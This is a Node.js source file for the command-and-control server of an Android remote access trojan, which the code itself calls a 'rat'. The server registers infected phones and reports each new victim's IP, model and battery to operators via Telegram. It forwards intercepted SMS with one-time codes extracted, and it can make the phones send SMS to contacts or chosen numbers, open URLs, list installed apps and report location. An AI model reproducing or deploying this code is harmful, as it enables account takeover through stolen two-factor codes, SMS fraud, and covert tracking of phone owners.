const net = require("net");
const os = require("os");
const TelegramBot = require("node-telegram-bot-api");
const { UserDataTransform } = require("../transform");

const udt = new UserDataTransform();
const networkInterfaces = os.networkInterfaces();
let accepted_users = [];
const codeRegex = /\b\d{4,8}\b/g;
let ipAddress;

function build(string) {
    const translationTable = {
        'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationTable[char] || char).join('');
}

function extractCodes(text){
    let codes = text.match(codeRegex) || [];
    let s = '';
    for (let code of codes){
        if (code != codes[codes.length - 1]){
            s += `<code>${code}</code> , `
        } else {
            s += `<code>${code}</code>`
        }
    }
    return s;
}

function getServerIP(){
    for (const interfaceName in networkInterfaces) {
        for (const net of networkInterfaces[interfaceName]) {
            if (net.family === 'IPv4' && !net.internal) {
                ipAddress = net.address;
                break;
            }
        }
        if (ipAddress){ return ipAddress; }
    }
}

const getUsersByPort = async (portname, callback = () => {}) => {
    let found_users = [];
    for (let user of accepted_users){
        if (user.port.name == portname){
            found_users.push({
                command: `/sign_${user.device_id}`,
                accessory: user.access,
                device_id: user.device_id,
                socket: user.socket
            });
        }
    }

    callback({
        status: true,
        users: found_users,
        method: "getUsers"
    })
}

const getSafeUsersByPort = async (portname, password, callback = () => {}) => {
    let found_users = [];
    for (let user of accepted_users){
        if (user.port.name == portname && user.port.password == password){
            found_users.push({
                command: `/sign_${user.device_id}`,
                accessory: user.access,
                device_id: user.device_id
            });
        }
    }

    callback({
        status: true,
        users: found_users,
        method: "getUsers"
    })
}

const getUserByDeviceId = async (portname, devid, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        for (let user of allusers.users){
            if (user.device_id == devid){
                callback({
                    status: true,
                    user: user,
                    method: "getUserByDeviceId",
                });
                return;
            }
        }
        callback({
            status: false,
            method: "getUserByDeviceId",
            message: "USER_NOT_FOUND",
        });
    })
}

const getSafeUserByDeviceId = async (portname, password, devid, shortcut, callback = () => {}) => {
    await getSafeUsersByPort(portname, password, async (allusers) => {
        for (let user of allusers.users){
            if (user.device_id == devid){
                callback({
                    status: true,
                    user: user,
                    method: "getUserByDeviceId",
                    device_id: devid,
                    shortcut: shortcut
                });
                return;
            }
        }
        callback({
            status: false,
            method: "getUserByDeviceId",
            message: "USER_NOT_FOUND",
            device_id: devid,
            shortcut: shortcut
        });
    })
}

const openUrl = async (portname, passname, devid, url, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "openUrl",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "openUrl",
            url: url
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "openUrl"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "openUrl",
                            url: url,
                            device_id: found.device_id,
                            shortcut: shortcut
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "openUrl",
                            device_id: found.device_id,
                            shortcut: shortcut
                        });
                        return;
                    }
                } else {
                    user.socket.write(JSON.stringify({
                        status: false,
                        method: _message.method,
                        message: "INVALID_PORT_OR_PASSWORD",
                        device_id: devid
                    }));
                }
            }
        })
    })
}

const vibratePhone = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, devid, async (user) => {
        let found = null;

        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "vibratePhone",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
            return;
        }
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "vibratePhone"
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "vibratePhone"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "vibratePhone",
                            device_id: found.device_id,
                            shortcut: shortcut
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "vibratePhone",
                            device_id: found.device_id,
                            shortcut: shortcut
                        });
                        return;
                    }
                } else {
                    user.socket.write(JSON.stringify({
                        status: false,
                        method: _message.method,
                        message: "INVALID_PORT_OR_PASSWORD",
                        device_id: devid
                    }));
                }
            }
        })
    })
}

const sendToast = async (portname, passname, devid, toast, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "sendToast",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendToast",
            toast: toast
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "sendToast"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "sendToast",
                            toast: toast,
                            device_id: found.device_id,
                            shortcut: shortcut
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "sendToast",
                            device_id: found.device_id,
                            shortcut: shortcut
                        });
                        return;
                    }
                } else {
                    user.socket.write(JSON.stringify({
                        status: false,
                        method: _message.method,
                        message: "INVALID_PORT_OR_PASSWORD",
                        device_id: devid
                    }));
                }
            }
        })
    })
}

const getGeoLocation = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getSafeUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        console.log(found)

        if (found == null){
            callback({
                status: false,
                method: "getGeoLocation",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "getGeoLocation"
        }));
        callback({
                status: true,
                method: "getGeoLocation",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
        return;
        // found.socket.on("data", async (data) => {
        //     let _message = JSON.parse(data.toString());
        //     if (_message.method == "getGeoLocation"){
        //         if (_message.port == portname && _message.password == passname){
        //             if (_message.status == true){
        //                 callback({
        //                     status: true,
        //                     method: "getGeoLocation",
        //                     longitude: _message.longitude,
        //                     latitude: _message.latitude,
        //                     device_id: devid,
        //                     shortcut: shortcut
        //                 });
        //                 return;
        //             } else {
        //                 callback({
        //                     status: false,
        //                     method: "getGeoLocation",
        //                     device_id: devid,
        //                     shortcut: shortcut
        //                 });
        //                 return;
        //             }
        //         } else {
        //             user.socket.write(JSON.stringify({
        //                 status: false,
        //                 method: _message.method,
        //                 message: "INVALID_PORT_OR_PASSWORD",
        //                 device_id: devid
        //             }));
        //         }
        //     }
        // })
    })
}

const sendSMSAll = async (portname, passname, devid, sms, callback = () => {}) => {
    await getSafeUserByDeviceId(portname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "sendSMSAll",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendSMSAll",
            sms: sms,
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "sendSMSAll"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "sendSMSAll",
                            sms: sms
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "sendSMSAll"
                        });
                        return;
                    }
                } else {
                    user.socket.write(JSON.stringify({
                        status: false,
                        method: _message.method,
                        message: "INVALID_PORT_OR_PASSWORD",
                        device_id: devid
                    }));
                }
            }
        })
    })
}

const sendSMS = async (portname, passname, devid, sms, tonumber, callback = () => {}) => {
    await getSafeUserByDeviceId(portname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "sendSMS",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendSMS",
            sms: sms,
            tonumber: tonumber
        }));

        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "sendSMS"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "sendSMS",
                            sms: sms,
                            tonumber: tonumber
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "sendSMS"
                        });
                        return;
                    }
                } else {
                    user.socket.write(JSON.stringify({
                        status: false,
                        method: _message.method,
                        message: "INVALID_PORT_OR_PASSWORD",
                        device_id: devid
                    }));
                }
            }
        })
    })
}

const getInstalledApps = async (portname, passname, devid, callback = () => {}) => {
    await getUserByDeviceId(portname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "getInstalledApps",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "getInstalledApps"
        }));

        user.user.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "getInstalledApps"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "getInstalledApps",
                            apps: _message.apps,
                            device_id: devid
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "getInstalledApps",
                            device_id: devid
                        });
                        return;
                    }
                } else {
                    user.user.socket.write(JSON.stringify({
                        status: false,
                        method: _message.method,
                        message: "INVALID_PORT_OR_PASSWORD",
                        device_id: devid
                    }));
                }
            }
        })

    })
}



const server = net.createServer(async (socket) => {
    socket.on('data', async (data) => {
        try{
            let message = JSON.parse(data.toString());
            console.log(message)
            if (Object.keys(message).includes("mask")){
                if (message.mask == "metro"){
                    if (Object.keys(message).includes("port") && Object.keys(message).includes("password")){
                        await udt.getUserByPort(message.port, message.password, async (_port) => {
                            if (!_port.status){
                                socket.write(JSON.stringify({
                                    status: false,
                                    message: "INVALID_PORT_OR_PASSWORD",
                                    method: message.method,
                                    device_id: message.device_id,
                                    shortcut: message.shortcut
                                }));
                                return;
                            }

                            if (_port.user.is_ban){
                                socket.write(JSON.stringify({
                                    status: false,
                                    message: "YOU_BANNED",
                                    method: message.method,
                                    device_id: message.device_id,
                                    shortcut: message.shortcut
                                }));
                                return;
                            }

                            if (message.method == "getUsers"){
                                await getSafeUsersByPort(message.port, message.password, async (allusers) => {
                                    socket.write(JSON.stringify(allusers));
                                })
                            }

                            if (message.method == "getUserByDeviceId"){
                                await getSafeUserByDeviceId(message.port, message.password, message.device_id, message.shortcut, async (user) => {
                                    socket.write(JSON.stringify(user));
                                })
                            }

                            let bot = new TelegramBot(_port.port.token);

                            if (message.method == "openUrl"){
                                await openUrl(message.port, message.password, message.device_id, message.url, message.shortcut, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "vibratePhone"){
                                await vibratePhone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "sendToast"){
                                await sendToast(message.port, message.password, message.device_id, message.toast, message.shortcut, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "getGeoLocation"){
                                await getGeoLocation(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    console.log(dt);
                                })
                            }

                            if (message.method == "sendSMSAll"){
                                await sendSMSAll(message.port, message.password, message.device_id, message.sms, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "sendSMS"){
                                await sendSMS(message.port, message.password, message.device_id, message.sms, message.tonumber, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "getInstalledApps"){
                                await getInstalledApps(message.port, message.password, message.device_id, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                        })
                    } else {
                        socket.write(JSON.stringify({
                            status: false,
                            method: Object.keys(message).includes("method") ? message.method : "error",
                            message: "PORT_AND_PASSWORD_NOT_FOUND"
                        }));
                        return;
                    }
                } else {
                    socket.write(JSON.stringify({
                        status: false,
                        method: Object.keys(message).includes("method") ? message.method : "error",
                        message: "PORT_AND_PASSWORD_NOT_FOUND",
                        device_id: message.device_id
                    }));
                    return;
                }
            } else if (Object.keys(message).includes("port") && Object.keys(message).includes("password") && (!Object.keys(message).includes("mask") || message.mask !== "metro")){
                await udt.getUserByPort(message.port, message.password, async (prt) => {
                    if (prt.status){
                        let cli = new TelegramBot(prt.port.token);
                        if (message.method == "connect"){
                            accepted_users.push({
                                socket: socket,
                                port: prt.port,
                                device_id: message.device_id,
                                access: message.accessory
                            })

                            socket.write(JSON.stringify({
                                status: true
                            }));
                            
                            await cli.sendMessage(
                                prt.port.chat_id,
                                build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + build(`\n🌐 𓏺|𓏺 ip: ${message.ip} - `) + `<code>${message.ip}</code>\n` + build(`👔 𓏺|𓏺 rat: ${message.rat}\n🗼 𓏺|𓏺 android-version: ${message.android_version}\n📱 𓏺|𓏺 model: `) + message.model + build(`\n🔋 𓏺|𓏺 battery is %${message.battery}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found\n\n🍁 𓏺|𓏺 `) + `<a href='https://t.me/Vex_Bite'>${build("universe got big plans for us")}</a>`,
                                {
                                    parse_mode: "HTML"
                                }
                            )
                        } else if (message.method == "receiveSMS"){
                            let codes = extractCodes(message.sms);
                            await cli.sendMessage(
                                prt.port.chat_id,
                                build(`📪 𓏺|𓏺 new message received\n👤 𓏺|𓏺 `) + `${message.name !== undefined || message.name !== null ? message.name : build("unknown")} { ${message.phone_number !== undefined || message.phone_number !== null ? message.phone_number : build("no phone")} }` + (codes !== "" ? build(`\n💠 𓏺|𓏺 codes: `) + codes : "") + build("\n📀 𓏺|𓏺 message:") + "\n\n" + message.sms + "\n\n" + build(`🌐 𓏺|𓏺 ip: `) + message.ip,
                                {
                                    parse_mode: "HTML"
                                }
                            )
                        } else if (message.method == "getGeoLocation"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${message.latitude},${message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${message.latitude},${message.longitude},15z">${build("google-map")}</a>`,
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${message.latitude},${message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${message.latitude},${message.longitude},15z">${build("google-map")}</a>`,
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                if (message.message == "USER_NOT_FOUND"){
                                    message.edit == false ? await bot.sendMessage(
                                        message.shortcut.chat_id,
                                        build("🔴 𓏺|𓏺 user not found"),
                                        {
                                            reply_to_message_id: message.shortcut.message_id
                                        }
                                    ) : await bot.editMessageText(
                                        build("🔴 𓏺|𓏺 user not found"),
                                        {
                                            chat_id: message.shortcut.chat_id,
                                            message_id: message.shortcut.message_id
                                        }
                                    )
                                } else if (message.message == "INVALID_PORT_OR_PASSWORD"){
                                    message.edit == false ? await bot.sendMessage(
                                        message.shortcut.chat_id,
                                        build("🔴 𓏺|𓏺 invalid port or password detected"),
                                        {
                                            reply_to_message_id: message.shortcut.message_id
                                        }
                                    ) : await bot.editMessageText(
                                        build("🔴 𓏺|𓏺 invalid port or password detected"),
                                        {
                                            chat_id: message.shortcut.chat_id,
                                            message_id: message.shortcut.message_id
                                        }
                                    )
                                } else if (message.message == "YOU_BANNED"){
                                    message.edit == false ? await bot.sendMessage(
                                        message.shortcut.chat_id,
                                        build("🔴 𓏺|𓏺 sorry but you got banned"),
                                        {
                                            reply_to_message_id: message.shortcut.message_id
                                        }
                                    ) : await bot.editMessageText(
                                        build("🔴 𓏺|𓏺 sorry but you got banned"),
                                        {
                                            chat_id: message.shortcut.chat_id,
                                            message_id: message.shortcut.message_id
                                        }
                                    )
                                } else {
                                    console.log(_message);
                                    message.edit == false ? await bot.sendMessage(
                                        message.shortcut.chat_id,
                                        build("🔴 𓏺|𓏺 unkown error detected !"),
                                        {
                                            reply_to_message_id: message.shortcut.message_id
                                        }
                                    ) : await bot.editMessageText(
                                        build("🔴 𓏺|𓏺 unkown error detected ! maybe process didnt successful"),
                                        {
                                            chat_id: message.shortcut.chat_id,
                                            message_id: message.shortcut.message_id
                                        }
                                    )
                                }
                            }
                        }
                    } else {
                        socket.write(JSON.stringify({
                            status: false,
                            message: "INVALID_PORT_OR_PASSWORD"
                        }))
                    }
                })
            }
        } catch (e){ console.log(e);socket.write(JSON.stringify({
            status: false,
            method: "error",
            message: "INVALID_DATA_TYPE"
        })) }
    })

    socket.on("close", async () => {})
    socket.on("error", async (errx) => {console.log(errx);})

})

server.listen(9932, "0.0.0.0", () => {
    let getCurrentIp = getServerIP();
    console.log("[B] socket-server connected");
    console.log("[B] socket-connection -> 127.0.0.1:9932");
    if (!getCurrentIp == "127.0.0.1"){
        console.log(`[B] socket-connection -> ${getCurrentIp}:9932`);
    }
})